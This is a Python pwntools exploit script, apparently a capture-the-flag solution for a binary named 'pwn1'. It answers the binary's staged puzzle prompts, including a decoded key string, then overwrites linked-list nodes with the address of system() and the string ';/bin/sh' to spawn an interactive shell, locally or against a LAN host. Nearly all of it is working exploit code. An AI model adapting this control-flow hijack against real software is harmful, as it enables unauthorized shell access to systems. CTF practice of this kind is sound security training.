from pwn import *
context(log_level='debug')
'''
def f4(s2):
	tmp=""
	s1= "rqzzepiwMLepiwYsLYtpqpvzLsYeM"
	keys="\x71"+'agvCYiheXulrpszNLwMtodbVx'
	print len(keys)
	for i in range(len(s2)):
		if keys[ord(s2[i])-97]!= s1[i]:
			return 0
	return 1
		

for i in range(97,124):
	if f4('mappingstringsforfunandprofit'+chr(i)):
		print 'mappingstringsforfunandprofit'+chr(i)
		break;
'''
DEBUG = 1
elf = ELF('./pwn1')
if DEBUG:
    p = process('./pwn1')
else:
    p = remote('192.168.31.49', 8000)



def main():
    p.sendlineafter('number!', str(((1338/3+18)/2)*37))
    ss = "[1, 1, 3, 5, 11, 21]"
    p.sendlineafter('numbers!', ss)
    p.sendlineafter("right?\n",'mappingstringsforfunandprofit{')
    pp=""
    pp += "1 1 0 0 0 2 1"
    p.sendlineafter('4.', pp)
    
    p.sendafter('node #1 to: ', p32(elf.plt['system'])*2)
    p.sendafter('node #2 to: ', ';/bin/sh\0')
    p.sendafter('node #3 to: ', p32(0)*2)
    p.sendafter('node #4 to: ', p32(0)*2)
    p.sendafter('node #5 to: ', p32(0)*2)
    p.sendafter('node #6 to: ', p32(0)*2)
    
    p.interactive()

if __name__ == "__main__":
    main()

			
		
